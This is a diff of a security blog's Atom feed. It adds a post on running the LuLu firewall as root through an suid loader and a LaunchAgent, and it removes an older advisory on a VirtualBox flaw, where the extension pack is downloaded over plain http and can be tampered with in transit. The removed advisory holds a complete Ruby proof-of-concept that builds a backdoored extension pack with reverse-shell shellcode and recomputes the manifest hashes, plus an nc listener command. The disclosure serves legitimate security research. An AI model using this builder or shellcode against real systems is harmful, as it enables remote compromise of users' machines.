@@ -6,7 +6,55 @@
   </author>
   <id>https://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2022-02-19T14:29:43+00:00</updated>
+  <updated>2022-02-28T21:15:24+00:00</updated>
+  <entry>
+    <id>https://m4.rkw.io/blog/lulu-firewall-hardening</id>
+    <link href="https://m4.rkw.io/blog/lulu-firewall-hardening"/>
+    <summary><p>I&#x27;m a big fan of Patrick Wardle&#x27;s free mac utilities but I noticed something odd
+about LuLu recently. It seems that it only filters egress traffic when LuLu.app
+is running. Since it normally runs as the local user rather than root, this
+makes it somewhat trivial for malware to defeat as it can simply kill the
+process and then connect to whatever it wants.</p><p>This can be mitigated by running the app as root, but since it&#x27;s not installed
+root-owned the first thing to do is change that:</p><p><pre>$ sudo chown -R root:wheel /Applications/LuLu.app/</pre></p><p>Then we need to create an suid loader binary to load it with. This needs to
+execute via the LaunchAgents mechanism in order for the application to work
+properly. So something like:</p><p><pre>$ cat &gt;lulu-as-root.c &lt;&lt;EOF
+&gt; #include &lt;unistd.h&gt;
+&gt;
+&gt; int main() {
+&gt;   if (getuid() != 501) {   # replace this with your user&#x27;s uid
+&gt;     return 0;
+&gt;   }
+&gt;   setuid(0);
+&gt;   seteuid(0);
+&gt;   execl(&quot;/Applications/LuLu.app/Contents/MacOS/LuLu&quot;, &quot;/Applications/LuLu.app/Contents/MacOS/LuLu&quot;, NULL);
+&gt;   return 0;
+&gt; }
+&gt; EOF
+$ sudo gcc -o /usr/local/bin/lulu-as-root lulu-as-root.c
+$ sudo chmod 4755 /usr/local/bin/lulu-as-root</pre></p><p>Then we need a LaunchAgent script to load it:</p><p><pre>$ cat &gt;~/Library/LaunchAgents/com.m4rkw.lulu.plist &lt;&lt;EOF
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
+&lt;plist version=&quot;1.0&quot;&gt;
+&lt;dict&gt;
+    &lt;key&gt;Label&lt;/key&gt;
+    &lt;string&gt;com.m4rkw.lulu&lt;/string&gt;
+    &lt;key&gt;ProgramArguments&lt;/key&gt;
+    &lt;array&gt;
+      &lt;string&gt;/usr/local/bin/lulu-as-root&lt;/string&gt;
+    &lt;/array&gt;
+    &lt;key&gt;RunAtLoad&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;KeepAlive&lt;/key&gt;
+    &lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+EOF</pre></p><p>Then kill the non-root process and re-launch LuLu as root:</p><p><pre>$ killall LuLu
+$ launchctl load -w ~/Library/LaunchAgents/com.m4rkw.lulu.plist
+</pre></p></summary>
+    <title>Lulu firewall hardening</title>
+    <updated>2022-02-26T21:21:01+00:00</updated>
+    <dc:date>2022-02-26T21:21:01+00:00</dc:date>
+  </entry>
   <entry>
     <id>https://m4.rkw.io/blog/touchid-over-ssh-part-2-secretive-agent</id>
     <link href="https://m4.rkw.io/blog/touchid-over-ssh-part-2-secretive-agent"/>
@@ -1293,203 +1341,5 @@ done</pre></p><p><pre>echo &quot;kapow&quot;</pre></p><p><pre>/tmp/murus411_exp
     <updated>2017-12-04T12:23:56+00:00</updated>
     <dc:date>2017-12-04T12:23:56+00:00</dc:date>
   </entry>
-  <entry>
-    <id>https://m4.rkw.io/blog/owning-virtualbox-via-mitm</id>
-    <link href="https://m4.rkw.io/blog/owning-virtualbox-via-mitm"/>
-    <summary><p>VirtualBox is a virtualisation application written by Oracle that is quite popular
-presumably because its free. I&#x27;m not a fan myself - if my mac locks up
-completely or kernel panics it&#x27;s usually because I&#x27;ve loaded the vbox kernel
-extensions less than 10 minutes ago. I use VMware Fusion instead (which is fairly
-expensive but IMO worth the money) and have a ritual whereby if I&#x27;ve had to load
-the vbox kernel extensions for work-related reasons I will reboot the machine
-before doing anything else.</p><p>I discovered back in May that if certain conditions are met it&#x27;s possible to
-achieve RCE in the VirtualBox application if you can MITM a user&#x27;s traffic. This
-is possible because, bizarrely, VirtualBox downloads updates over plain http:</p><p><pre>https://m4.rkw.io/img/vbox_nossl.png</pre></p><p>This is true for both the pkg installer (which carries an Apple Developer code
-signature, making tampering with it tricky) and also for the multi-architecture
-extension pack, which has no code signature.</p><p>https://m4.rkw.io/img/vbox_nossl2.png</p><p>Despite reporting this to Oracle nearly 7 months ago they still haven&#x27;t managed
-to put an SSL certificate on the download site. Hopefully this advisory will
-make people aware of the issue and encourage them to manually verify the
-checksum of the extension pack should they be in a situation where they&#x27;ve
-downloaded it manually.</p><p>Little Snitch shows that vbox does talk to update.virtualbox.org over https to
-retrieve the version information, but the extension pack itself is downloaded
-over http.</p><p>https://m4.rkw.io/img/vbox_ls.png</p><p>The extension pack for macOS is a gzipped tarball containing these files:</p><p><pre>ExtPack-license.html
-ExtPack-license.rtf
-ExtPack-license.txt
-ExtPack.manifest
-ExtPack.signature
-ExtPack.xml
-PXE-Intel.rom
-darwin.amd64
-linux.amd64
-linux.x86
-solaris.amd64
-win.amd64
-win.x86</pre></p><p>ExtPack.signature looked interesting and potentially would thwart this attack
-vector but at the time of writing it simply contains the string &quot;todo&quot; LOL.</p><p>$ cat ExtPack.signature
-todo</p><p>In the darwin.amd64 directory we have a bunch of dylibs:</p><p><pre>$ ls -1 darwin.amd64/
-VBoxEhciR0.r0
-VBoxEhciR3.dylib
-VBoxEhciRC.rc
-VBoxHostWebcam.dylib
-VBoxNvmeR0.r0
-VBoxNvmeR3.dylib
-VBoxNvmeRC.rc
-VBoxPuelMain.dylib
-VBoxUsbCardReaderR3.dylib
-VBoxUsbWebcamR3.dylib
-VBoxVRDP.dylib
-VDPluginCrypt.dylib</pre></p><p>These are dynamic libraries that VirtualBox loads in order to add additional
-functionality. With a dylib you can define a custom constructor which will get
-executed as soon as the dylib is loaded. Something like this:</p><p><pre>--------------------------------------
-__attribute__((constructor))
-void customConstructor(int argc, char **argv)
-{
-  system(&quot;touch /tmp/LOL&quot;);
-}
---------------------------------------</pre></p><p>If VirtualBox loads this, the code in the constructor will get executed. The
-extpack also has a manifest file which, bizarrely, contains hashes for all of
-the dylibs in a handful of different hash formats.</p><p>$ grep VBoxEhciR3.dylib ExtPack.manifest
-MD5 (darwin.amd64/VBoxEhciR3.dylib) = d3fddbcadfa01e4f9ccd2e23de119c3f
-SHA256 (darwin.amd64/VBoxEhciR3.dylib) =
-f8692e2223ef6b90b84011b437f38873a907933ab6f822e6301d0d4e65427e0a
-SHA512 (darwin.amd64/VBoxEhciR3.dylib) =
-42750441b2054f3b63937e6e54f58af72978091adbe4c5efc18b04f429d84c07ca0818af1f361c0b53dec62b157d3e042a60ae030bfd7e147de73c19de694670
-SHA1 (darwin.amd64/VBoxEhciR3.dylib) = 0eef387c4de5441aa0623ae677ff8f0c21002f46
-SIZE (darwin.amd64/VBoxEhciR3.dylib) = 90064</p><p>Oh and they also list the size for good measure lol :P</p><p>So if we roll a fake dylib into an extpack tarball and set the size and hashes
-correctly, if the user clicks on the extpack VirtualBox will install it without
-any verification and then load the dylib and execute the constructor as soon as
-the user starts a VM.</p><p>There is a catch though, although Vbox will install our modified extpack without
-verification when we click on it manually, the update mechanism performs a
-sha256 hash check.</p><p>The update process for vbox is:</p><p><pre>1) Older version (eg 5.1.20) is launched, the user is prompted to download the
-newest version.  The link provided here is http:// so this alone could be
-intercepted and modified, but it would require a developer cert to sign a new
-pkg bundle for the user to install.</pre></p><p>2) After installing the new version, on the next launch it will prompt the user
-to install the new extpack for 5.1.22.  The API call to update.virtualbox.org
-happens over SSL so we can&#x27;t mess with the version numbers or the hashes that
-correspond to the new extpack.</p><p>Now if we MITM the request to download.virtualbox.org and send our hacked
-extpack, VirtualBox says:</p><p><pre>https://m4.rkw.io/img/vbox_reject.png</pre></p><p>So it&#x27;s telling us to download it manually from the website.  A user seeing
-this probably wouldn&#x27;t suspect anything other than an Oracle mishap so they
-would likely hop over to virtualbox.org to download the extpack manually. The
-website does say &quot;check the hashes&quot; and provides SHA256 and MD5 checksums (which
-are served over SSL).</p><p>The website www.virtualbox.org is served over SSL.. but the download link for
-the extension pack points to download.virtualbox.org over http://. This is bad
-because it means we can leave www.virtualbox.org un-messed-with so the user sees
-the SSL load correctly (and is lulled into a false sense of security because of
-the SSL padlock), but still MITM download.virtualbox.org in order to send our
-hacked payload.</p><p>The filename for the extpack as its linked on the website is slightly different
-to the one requested by the application but we can still intercept it, and since
-it was downloaded manually vbox doesn&#x27;t verify the signature and just merrily
-installs it, allowing us to compromise the host.  Of course if a user is
-paranoid enough to check the hashes then they&#x27;ll notice something is wrong, but
-how many users are realistically going to do that?</p><p>Amusingly, on installation it warns you to only install extension packs that you
-got from a trusted source - like, I dunno, say, the website of a trusted (?!)
-vendor THAT HAS ITS OWN CERTIFICATE AUTHORITY that you just loaded over SSL?</p><p>As soon as any VM is started the code in our malicious dylib gets executed as
-the user running VirtualBox on the host machine.</p><p>Obviously this will only work if the user doesn&#x27;t have the latest version, as
-otherwise there would be no reason for them to download an extpack. However vbox
-updates are fairly frequent so an attacker waiting around with MITM capability
-probably wouldn&#x27;t have to wait too long before being able to execute this
-attack.</p><p>The PoC code below downloads the latest extension pack from the VirtualBox
-website and modifies it with a reverse tcp shellcode backdoor that will be
-executed as soon as a VM is started.</p><p>To test it you can simply click on it to install it into virtualbox, listen for
-a shell with nc, eg:</p><p><pre>$ nc -l 5555</pre></p><p>and then start any vm.</p><p><pre>https://m4.rkw.io/vbox_extpack_builder.rb.txt
-6148d6aa7ad2896ae3679ed8e2ff46e7156fd9db9c9ef39fa4116c9566848606
-----------------------------------------------------------------------------
-#!/usr/bin/env ruby</pre></p><p><pre># RCE PoC builder for VirtualBox extension packs
-# Tested with version 5.2.2 on 30/11/17
-#
-# Discovered by m4rkw, shouts to #coolkids
-# PoC is for darwin.amd64 but other architectures are likely vulnerable
-#
-# This builds a backdoored extension pack which VirtualBox will happily install.
-# Once installed, when an OSX/64bit VM is started it will trigger the shellcode
-# and initiate a connectback shell.
-#
-# Thanks to Jacob Hammack for the shellcode</pre></p><p><pre>require &#x27;digest&#x27;</pre></p><p><pre>puts
-puts &quot;RCE PoC builder for VirtualBox extension pack&quot;
-puts &quot;discovered by m4rkw, shouts to #coolkids&quot;
-puts
-puts &quot;PoC is for darwin.amd64 but other architectures may be vulnerable&quot;
-puts
-puts &quot;This builds a backdoored extension pack which VirtualBox will happily install.&quot;
-puts &quot;Once installed, when any VM is started it will trigger the shellcode and&quot;
-puts &quot;initiate a connectback shell to the specified IP and port&quot;
-puts
-puts &quot;Thanks to Jacob Hammack for the shellcode&quot;
-puts</pre></p><p><pre>if ARGV.length &lt; 2
-  puts &quot;Usage: #{__FILE__} &lt;ip&gt; &lt;port&gt;&quot;
-  puts
-  exit 0
-end</pre></p><p><pre>target_dylib = &quot;VBoxEhciR3.dylib&quot;</pre></p><p><pre>puts &quot;compiling attack.dylib...&quot;</pre></p><p><pre>File.open(&quot;attack.c&quot;,&quot;w&quot;) do |f|
-  f.write(&quot;#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/mman.h&gt;
-#include &lt;arpa/inet.h&gt;
-#include &lt;unistd.h&gt;</pre></p><p><pre>int (*sc)();</pre></p><p><pre>char target_ip[] = \&quot;#{ARGV[0]}\&quot;;
-short target_port = #{ARGV[1]};</pre></p><p><pre>char shellcode[] =
-  \&quot;\\x41\\xB0\\x02\\x49\\xC1\\xE0\\x18\\x49\\x83\\xC8\\x61\\x4C\\x89\\xC0\\x48\&quot;
-  \&quot;\\x31\\xD2\\x48\\x89\\xD6\\x48\\xFF\\xC6\\x48\\x89\\xF7\\x48\\xFF\\xC7\\x0F\&quot;
-  \&quot;\\x05\\x49\\x89\\xC4\\x49\\xBD\\x01\\x01\\x11\\x5C\\xFF\\xFF\\xFF\\xFF\\x41\&quot;
-  \&quot;\\xB1\\xFF\\x4D\\x29\\xCD\\x41\\x55\\x49\\x89\\xE5\\x49\\xFF\\xC0\\x4C\\x89\&quot;
-  \&quot;\\xC0\\x4C\\x89\\xE7\\x4C\\x89\\xEE\\x48\\x83\\xC2\\x10\\x0F\\x05\\x49\\x83\&quot;
-  \&quot;\\xE8\\x08\\x48\\x31\\xF6\\x4C\\x89\\xC0\\x4C\\x89\\xE7\\x0F\\x05\\x48\\x83\&quot;
-  \&quot;\\xFE\\x02\\x48\\xFF\\xC6\\x76\\xEF\\x49\\x83\\xE8\\x1F\\x4C\\x89\\xC0\\x48\&quot;
-  \&quot;\\x31\\xD2\\x49\\xBD\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x49\\xC1\\xED\&quot;
-  \&quot;\\x08\\x41\\x55\\x48\\x89\\xE7\\x48\\x31\\xF6\\x0F\\x05\&quot;;</pre></p><p><pre>__attribute__((constructor))
-void customConstructor(int argc, char **argv)
-{
-  struct in_addr ip;
-  char *tp = (char *)&amp;target_port;</pre></p><p><pre>  shellcode[38] = tp[1];
-  shellcode[39] = tp[0];</pre></p><p><pre>  inet_aton(target_ip, (struct in_addr *)&amp;ip);
-  memcpy((char *)&amp;shellcode[40], (char *)&amp;ip.s_addr, 4);</pre></p><p><pre>  void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);</pre></p><p><pre>  if (ptr == MAP_FAILED) {
-    perror(\&quot;mmap\&quot;);
-    exit(-1);
-  }
-  memcpy(ptr, shellcode, sizeof(shellcode));
-  sc = ptr;</pre></p><p><pre>  sc();
-}
-&quot;)
-end</pre></p><p><pre>system(&quot;clang -dynamiclib -std=gnu99 attack.c -o attack.dylib&quot;)
-File.delete(&quot;attack.c&quot;)</pre></p><p><pre>if !File.exist? &quot;vbox_exp_temp&quot;
-  Dir.mkdir(&quot;vbox_exp_temp&quot;)
-end
-Dir.chdir(&quot;vbox_exp_temp&quot;)</pre></p><p><pre>puts &quot;looking for latest extpack at virtualbox.org...&quot;</pre></p><p><pre>downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`</pre></p><p><pre>match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)</pre></p><p><pre>if !match or !match[0]
-  puts &quot;failed to find http:// link to the extpack.&quot;
-  exit 1
-end</pre></p><p><pre>puts &quot;downloading extpack... &quot;</pre></p><p><pre>filename = match[0].split(&quot;/&quot;)[-1]</pre></p><p><pre>system(&quot;curl -s #{match[0]} -o #{filename}&quot;)</pre></p><p><pre>puts &quot;unpacking extpack... &quot;</pre></p><p><pre>system(&quot;tar zxf #{filename}&quot;)
-File.delete(filename)</pre></p><p><pre>puts &quot;substituting #{target_dylib}... &quot;</pre></p><p><pre>File.delete(&quot;darwin.amd64/#{target_dylib}&quot;)
-File.rename(&quot;../attack.dylib&quot;, &quot;darwin.amd64/#{target_dylib}&quot;)</pre></p><p><pre>puts &quot;patching manifest... &quot;</pre></p><p><pre>File.open(&quot;ExtPack.manifest.new&quot;,&quot;w&quot;) do |f|
-  File.read(&quot;ExtPack.manifest&quot;).chomp.split(&quot;\n&quot;).each do |line|
-    r = target_dylib.gsub(&#x27;.&#x27;,&#x27;\.&#x27;)</pre></p><p><pre>    if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
-      case match[1]
-      when &quot;MD5&quot;
-        md5 = Digest::MD5.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;MD5 (darwin.amd64/#{target_dylib}) = #{md5}\n&quot;)
-      when &quot;SHA256&quot;
-        sha256 = Digest::SHA256.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;SHA256 (darwin.amd64/#{target_dylib}) = #{sha256}\n&quot;)
-      when &quot;SHA512&quot;
-        sha512 = Digest::SHA512.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;SHA512 (darwin.amd64/#{target_dylib}) = #{sha512}\n&quot;)
-      when &quot;SHA1&quot;
-        sha1 = Digest::SHA1.hexdigest File.read(&quot;darwin.amd64/#{target_dylib}&quot;)
-        f.write(&quot;SHA1 (darwin.amd64/#{target_dylib}) = #{sha1}\n&quot;)
-      when &quot;SIZE&quot;
-        size = File.size &quot;darwin.amd64/#{target_dylib}&quot;
-        f.write(&quot;SIZE (darwin.amd64/#{target_dylib}) = #{size}\n&quot;)
-      end
-    else
-      f.write(line + &quot;\n&quot;)
-    end
-  end
-end</pre></p><p><pre>File.delete(&quot;ExtPack.manifest&quot;)
-File.rename(&quot;ExtPack.manifest.new&quot;, &quot;ExtPack.manifest&quot;)</pre></p><p><pre>puts &quot;creating tarball... &quot;
-system(&quot;tar -zcf ../#{filename} *&quot;)</pre></p><p><pre>Dir.chdir(&quot;..&quot;)
-system(&quot;rm -rf vbox_exp_temp&quot;)</pre></p><p><pre>puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;
-</pre></p></summary>
-    <title>Owning VirtualBox via MITM</title>
-    <updated>2017-11-30T08:25:03+00:00</updated>
-    <dc:date>2017-11-30T08:25:03+00:00</dc:date>
-  </entry>
-  <dc:date>2022-02-19T14:29:43+00:00</dc:date>
+  <dc:date>2022-02-28T21:15:24+00:00</dc:date>
 </feed>
